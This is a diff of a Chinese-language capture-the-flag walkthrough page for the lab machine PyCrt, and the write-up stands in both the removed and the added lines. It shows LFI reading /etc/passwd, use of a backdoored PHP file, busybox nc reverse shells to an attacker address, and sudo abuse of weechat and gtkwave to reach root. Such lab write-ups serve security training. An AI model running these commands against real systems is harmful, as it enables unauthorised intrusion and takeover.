@@ -22,7 +22,7 @@
 <meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Pycrt.html">
 <meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
 <title>内部_Pycrt</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -46,17 +46,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -90,130 +80,142 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1><strong>一、信息收集</strong></h1>
 <h2><strong>1. 主机发现与端口扫描</strong></h2>
-<p>首先在本地网络中使用 <code class="notranslate">arp-scan</code> 确定目标主机的IP地址，随后利用 <code class="notranslate">nmap</code> 对其进行全端口扫描，以识别开放的服务。</p>
+<p>首先在本地网络中使用 <code>arp-scan</code> 确定目标主机的IP地址，随后利用 <code>nmap</code> 对其进行全端口扫描，以识别开放的服务。</p>
 <p><strong>主机发现:</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ sudo arp-scan -l
 ...
 192.168.205.131 08:00:27:75:0e:4e       PCS Systemtechnik GmbH
-...</pre></div>
+...
+</code></pre>
 <p><strong>端口扫描:</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+<pre lang="bash"><code>┌──(kali㉿kali)-[~]
 └─$ nmap -p- 192.168.205.131
 ...
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 6667/tcp open  irc
-...</pre></div>
-<p>扫描结果表明，目标主机IP为 <code class="notranslate">192.168.205.131</code>，开放了 <strong>22 (SSH)</strong>、<strong>80 (HTTP)</strong> 和 <strong>6667 (IRC)</strong> 端口。</p>
+...
+</code></pre>
+<p>扫描结果表明，目标主机IP为 <code>192.168.205.131</code>，开放了 <strong>22 (SSH)</strong>、<strong>80 (HTTP)</strong> 和 <strong>6667 (IRC)</strong> 端口。</p>
 <h2><strong>2. 服务侦察</strong></h2>
 <ul>
 <li>
 <p><strong>HTTP (80端口):</strong> 访问该端口发现是 Apache2 的默认欢迎页面，没有直接可利用的信息。</p>
 </li>
 <li>
-<p><strong>IRC (6667端口):</strong> 这是关键的突破口。使用 <code class="notranslate">irssi</code> 客户端连接到该服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">irssi -c 192.168.205.131 -p 6667</pre></div>
+<p><strong>IRC (6667端口):</strong> 这是关键的突破口。使用 <code>irssi</code> 客户端连接到该服务。</p>
+<pre lang="bash"><code>irssi -c 192.168.205.131 -p 6667
+</code></pre>
 <p>在连接后的服务器欢迎信息 (MOTD) 中，发现一条至关重要的线索：</p>
 <blockquote>
-<p><code class="notranslate">...issues ShadowSec directory...</code><br>
-这强烈暗示Web服务上可能存在一个名为 <code class="notranslate">ShadowSec</code> 的目录。</p>
+<p><code>...issues ShadowSec directory...</code>
+这强烈暗示Web服务上可能存在一个名为 <code>ShadowSec</code> 的目录。</p>
 </blockquote>
 </li>
 </ul>
 <h1><strong>二、漏洞发现与初始访问</strong></h1>
 <h2><strong>1. Web目录与代码审计</strong></h2>
-<p>根据 IRC 服务提供的线索，访问 <code class="notranslate">http://192.168.205.131/ShadowSec/</code>，发现一个静态页面。对该目录进行深度扫描，发现一个隐藏的文件 <code class="notranslate">bydataset.php</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>根据 IRC 服务提供的线索，访问 <code>http://192.168.205.131/ShadowSec/</code>，发现一个静态页面。对该目录进行深度扫描，发现一个隐藏的文件 <code>bydataset.php</code>。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
 ...
 /bydataset.php        (Status: 200)
-...</pre></div>
+...
+</code></pre>
 <h1><strong>2. LFI 到 RCE</strong></h1>
-<p>通过对 <code class="notranslate">bydataset.php</code> 进行参数模糊测试，发现一个 <code class="notranslate">file</code> 参数存在本地文件包含 (LFI) 漏洞。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<p>通过对 <code>bydataset.php</code> 进行参数模糊测试，发现一个 <code>file</code> 参数存在本地文件包含 (LFI) 漏洞。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ gobuster dir -u http://192.168.205.131/ShadowSec/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,html,zip,db,bak -t 64 
 ...
 file                    [Status: 200, Size: 1452, Words: 13, Lines: 28, Duration: 14ms]
 ...
 
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd<span class="pl-pds">'</span></span>
+└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=/etc/passwd'
 root:x:0:0:root:/root:/bin/bash
 ...
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-...</pre></div>
-<p>利用该LFI漏洞，读取 <code class="notranslate">bydataset.php</code> 文件自身的源代码，发现其包含一个后门。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php<span class="pl-pds">'</span></span></pre></div>
+...
+</code></pre>
+<p>利用该LFI漏洞，读取 <code>bydataset.php</code> 文件自身的源代码，发现其包含一个后门。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl 'http://192.168.205.131/ShadowSec/bydataset.php?file=bydataset.php'
+</code></pre>
 <p>源码审计结果如下：</p>
 <ul>
 <li>当接收到 <strong>POST</strong> 请求时。</li>
-<li>需要一个 <code class="notranslate">auth</code> 参数，其值必须为硬编码的 <code class="notranslate">'LetMeIn123!'</code>。</li>
-<li>接收一个 <code class="notranslate">payload</code> 参数，该参数经过 <code class="notranslate">strrev()</code> (字符串反转) 和 <code class="notranslate">base64_decode()</code> 解码后，如果以 <code class="notranslate">cmd:</code> 开头，则其后的内容会被 <code class="notranslate">exec()</code> 函数执行。</li>
+<li>需要一个 <code>auth</code> 参数，其值必须为硬编码的 <code>'LetMeIn123!'</code>。</li>
+<li>接收一个 <code>payload</code> 参数，该参数经过 <code>strrev()</code> (字符串反转) 和 <code>base64_decode()</code> 解码后，如果以 <code>cmd:</code> 开头，则其后的内容会被 <code>exec()</code> 函数执行。</li>
 </ul>
 <p>这是一个典型的、精心构造的远程代码执行 (RCE) 漏洞。</p>
 <h2><strong>3. 获取 www-data Shell</strong></h2>
 <p>根据源码逻辑，构造我们的Payload。</p>
 <ol>
-<li><strong>目标命令:</strong> <code class="notranslate">id</code></li>
-<li><strong>构造字符串:</strong> <code class="notranslate">cmd:id</code></li>
-<li><strong>Base64编码:</strong> <code class="notranslate">Y21kOmlk</code></li>
-<li><strong>字符串反转:</strong> <code class="notranslate">klimDk12Y</code></li>
+<li><strong>目标命令:</strong> <code>id</code></li>
+<li><strong>构造字符串:</strong> <code>cmd:id</code></li>
+<li><strong>Base64编码:</strong> <code>Y21kOmlk</code></li>
+<li><strong>字符串反转:</strong> <code>klimDk12Y</code></li>
 </ol>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
+<pre><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x/php_filter_chain_generator]
 └─$ echo -n 'cmd:id' | base64 -w0 | rev  
 klmOk12Y 
 </code></pre>
-<p>使用 <code class="notranslate">curl</code> 发送构造好的POST请求，成功验证RCE。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ curl -X POST --data <span class="pl-s"><span class="pl-pds">'</span>auth=LetMeIn123!<span class="pl-pds">'</span></span> --data-urlencode <span class="pl-s"><span class="pl-pds">"</span>payload=klmOk12Y<span class="pl-pds">"</span></span> http://192.168.205.131/ShadowSec/bydataset.php
-<span class="pl-k">&lt;</span>pre<span class="pl-k">&gt;</span>uid=33(www-data) gid=33(www-data) groups=33(www-data)<span class="pl-k">&lt;</span>/pre<span class="pl-k">&gt;</span></pre></div>
-<p>接下来，构造反弹Shell的Payload，在本地Kali开启监听后，成功获取 <code class="notranslate">www-data</code> 用户的交互式Shell。</p>
+<p>使用 <code>curl</code> 发送构造好的POST请求，成功验证RCE。</p>
+<pre lang="bash"><code>┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -X POST --data 'auth=LetMeIn123!' --data-urlencode &quot;payload=klmOk12Y&quot; http://192.168.205.131/ShadowSec/bydataset.php
+&lt;pre&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/pre&gt;
+</code></pre>
+<p>接下来，构造反弹Shell的Payload，在本地Kali开启监听后，成功获取 <code>www-data</code> 用户的交互式Shell。</p>
 <p><strong>本地监听:</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
 <p><strong>构造并执行Payload:</strong></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))</span>
-curl -X POST --data <span class="pl-s"><span class="pl-pds">'</span>auth=LetMeIn123!<span class="pl-pds">'</span></span> --data-urlencode <span class="pl-s"><span class="pl-pds">"</span>payload=oNXY...<span class="pl-pds">"</span></span> http://...</pre></div>
+<pre lang="bash"><code># Payload: rev(base64('cmd:busybox nc 192.168.205.128 8888 -e /bin/bash'))
+curl -X POST --data 'auth=LetMeIn123!' --data-urlencode &quot;payload=oNXY...&quot; http://...
+</code></pre>
 <h1><strong>三、权限提升</strong></h1>
 <h2><strong>1. www-data -&gt; chatlake</strong></h2>
-<p>获取初步Shell后，执行 <code class="notranslate">sudo -l</code> 查看当前用户的 <code class="notranslate">sudo</code> 权限。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@PyCrt:/tmp$ sudo -l
+<p>获取初步Shell后，执行 <code>sudo -l</code> 查看当前用户的 <code>sudo</code> 权限。</p>
+<pre lang="bash"><code>www-data@PyCrt:/tmp$ sudo -l
 ...
 User www-data may run the following commands on PyCrt:
-    (chatlake) NOPASSWD: /usr/bin/weechat</pre></div>
-<p>发现 <code class="notranslate">www-data</code> 用户可以以 <code class="notranslate">chatlake</code> 用户的身份，免密运行终端IRC客户端 <code class="notranslate">weechat</code>。这是一个提权路径。</p>
+    (chatlake) NOPASSWD: /usr/bin/weechat
+</code></pre>
+<p>发现 <code>www-data</code> 用户可以以 <code>chatlake</code> 用户的身份，免密运行终端IRC客户端 <code>weechat</code>。这是一个提权路径。</p>
 <ol>
 <li>
 <p>首先稳定当前shell，使其成为一个功能完整的TTY。</p>
 </li>
 <li>
-<p>执行提权命令，启动<code class="notranslate">weechat</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo -u chatlake /usr/bin/weechat</pre></div>
-</li>
-<li>
-<p>在 <code class="notranslate">weechat</code> 客户端内部，利用其 <code class="notranslate">/exec</code> 功能执行命令，反弹一个新的shell。</p>
-<pre class="notranslate"><code class="notranslate">/exec busybox nc 192.168.205.128 9999 -e /bin/bash
+<p>执行提权命令，启动<code>weechat</code>。</p>
+<pre lang="bash"><code>sudo -u chatlake /usr/bin/weechat
 </code></pre>
 </li>
 <li>
-<p>在本地 <code class="notranslate">9999</code> 端口成功接收到 <code class="notranslate">chatlake</code> 用户的shell。</p>
+<p>在 <code>weechat</code> 客户端内部，利用其 <code>/exec</code> 功能执行命令，反弹一个新的shell。</p>
+<pre><code>/exec busybox nc 192.168.205.128 9999 -e /bin/bash
+</code></pre>
+</li>
+<li>
+<p>在本地 <code>9999</code> 端口成功接收到 <code>chatlake</code> 用户的shell。</p>
 </li>
 </ol>
 <h2><strong>2. chatlake -&gt; pycrtlake</strong></h2>
-<p>获取 <code class="notranslate">chatlake</code> 权限后，再次执行 <code class="notranslate">sudo -l</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">chatlake@PyCrt:<span class="pl-k">~</span>$ sudo -l
+<p>获取 <code>chatlake</code> 权限后，再次执行 <code>sudo -l</code>。</p>
+<pre lang="bash"><code>chatlake@PyCrt:~$ sudo -l
 ...
 User chatlake may run the following commands on PyCrt:
-    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service</pre></div>
-<p><code class="notranslate">chatlake</code> 可以免密启动一个名为 <code class="notranslate">irc_bot.service</code> 的服务。检查该服务文件发现，它会以 <code class="notranslate">pycrtlake</code> 用户身份运行一个Python脚本 <code class="notranslate">/usr/local/bin/irc_bot.py</code>，且我们无法直接修改这两个文件。</p>
+    (ALL) NOPASSWD: /usr/bin/systemctl start irc_bot.service
+</code></pre>
+<p><code>chatlake</code> 可以免密启动一个名为 <code>irc_bot.service</code> 的服务。检查该服务文件发现，它会以 <code>pycrtlake</code> 用户身份运行一个Python脚本 <code>/usr/local/bin/irc_bot.py</code>，且我们无法直接修改这两个文件。</p>
 <p>这表明提权需要与这个IRC机器人进行交互。</p>
 <ol>
-<li>首先，启动该服务：<code class="notranslate">sudo /usr/bin/systemctl start irc_bot.service</code>。</li>
-<li>使用 <code class="notranslate">weechat</code> 客户端连接到本地 <code class="notranslate">6667</code> 端口，并加入频道。</li>
+<li>首先，启动该服务：<code>sudo /usr/bin/systemctl start irc_bot.service</code>。</li>
+<li>使用 <code>weechat</code> 客户端连接到本地 <code>6667</code> 端口，并加入频道。</li>
 </ol>
-<pre class="notranslate"><code class="notranslate">/server add x localhost/6667
+<pre><code>/server add x localhost/6667
 /connect x
 /LIST
          │00:56:17       x  -- | End of message of the day.
@@ -227,7 +229,7 @@ User chatlake may run the following commands on PyCrt:
 </code></pre>
 <ol start="3">
 <li>
-<p>在频道6中，一个名为 <code class="notranslate">@admin</code> 的机器人提示需要遵循“格式要求”，并以 <code class="notranslate">:)</code> 结尾。</p>
+<p>在频道6中，一个名为 <code>@admin</code> 的机器人提示需要遵循“格式要求”，并以 <code>:)</code> 结尾。</p>
 </li>
 <li>
 <p><strong>发现漏洞利用条件：</strong> 与机器人交互后发现，其存在一个复杂的触发机制：</p>
@@ -245,39 +247,44 @@ User chatlake may run the following commands on PyCrt:
 </li>
 </ol>
 <h2><strong>3. pycrtlake -&gt; root</strong></h2>
-<p>这是最后一步提权。在 <code class="notranslate">pycrtlake</code> shell中执行 <code class="notranslate">sudo -l</code>。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">pycrtlake@PyCrt:<span class="pl-k">~</span>$ sudo -l
+<p>这是最后一步提权。在 <code>pycrtlake</code> shell中执行 <code>sudo -l</code>。</p>
+<pre lang="bash"><code>pycrtlake@PyCrt:~$ sudo -l
 ...
 User pycrtlake may run the following commands on PyCrt:
-    (ALL) NOPASSWD: /usr/bin/gtkwave</pre></div>
-<p><code class="notranslate">pycrtlake</code> 用户可以免密以 <code class="notranslate">root</code> 身份运行GUI程序 <code class="notranslate">gtkwave</code>。</p>
+    (ALL) NOPASSWD: /usr/bin/gtkwave
+</code></pre>
+<p><code>pycrtlake</code> 用户可以免密以 <code>root</code> 身份运行GUI程序 <code>gtkwave</code>。</p>
 <ol>
 <li>
-<p>直接运行会因缺少 <code class="notranslate">DISPLAY</code> 环境变量而失败。</p>
+<p>直接运行会因缺少 <code>DISPLAY</code> 环境变量而失败。</p>
 </li>
 <li>
-<p>该程序的 <code class="notranslate">-W</code> 命令行模式也因同样原因无法直接使用。</p>
+<p>该程序的 <code>-W</code> 命令行模式也因同样原因无法直接使用。</p>
 </li>
 <li>
-<p><strong>最终解决方案：</strong> 使用 <strong>Xvfb (X Virtual Framebuffer)</strong> 创建一个虚拟的图形环境来欺骗 <code class="notranslate">gtkwave</code>。</p>
+<p><strong>最终解决方案：</strong> 使用 <strong>Xvfb (X Virtual Framebuffer)</strong> 创建一个虚拟的图形环境来欺骗 <code>gtkwave</code>。</p>
 </li>
 <li>
-<p>首先，在 <code class="notranslate">/tmp</code> 目录启动一个虚拟显示服务。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">Xvfb :1 <span class="pl-k">&amp;</span></pre></div>
+<p>首先，在 <code>/tmp</code> 目录启动一个虚拟显示服务。</p>
+<pre lang="bash"><code>Xvfb :1 &amp;
+</code></pre>
 </li>
 <li>
-<p>利用 <code class="notranslate">gtkwave</code> 的 <code class="notranslate">-W</code> (wish) 参数，在指定的虚拟显示环境中启动一个拥有 <code class="notranslate">root</code> 权限的Tcl交互式命令行。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">sudo DISPLAY=:1 /usr/bin/gtkwave -W</pre></div>
+<p>利用 <code>gtkwave</code> 的 <code>-W</code> (wish) 参数，在指定的虚拟显示环境中启动一个拥有 <code>root</code> 权限的Tcl交互式命令行。</p>
+<pre lang="bash"><code>sudo DISPLAY=:1 /usr/bin/gtkwave -W
+</code></pre>
 </li>
 <li>
-<p>命令执行后，会得到一个Tcl的提示符 <code class="notranslate">%</code>。在这个 <code class="notranslate">root</code> 权限的shell中，可以直接读取 <code class="notranslate">root</code> 目录下的最终flag。</p>
-<div class="highlight highlight-source-tcl"><pre class="notranslate">% id
+<p>命令执行后，会得到一个Tcl的提示符 <code>%</code>。在这个 <code>root</code> 权限的shell中，可以直接读取 <code>root</code> 目录下的最终flag。</p>
+<pre lang="tcl"><code>% id
 uid=0(root) gid=0(root) groups=0(root)
 % cat /root/root.txt /home/chatlake/user.txt
 flag{e80ecc46ca5e00bf8a51c47f0cc3e868}
-flag{b42baba466402e32157a1cbba819664e}</pre></div>
+flag{b42baba466402e32157a1cbba819664e}
+</code></pre>
 </li>
-</ol></div>
+</ol>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -302,7 +309,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -349,70 +356,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
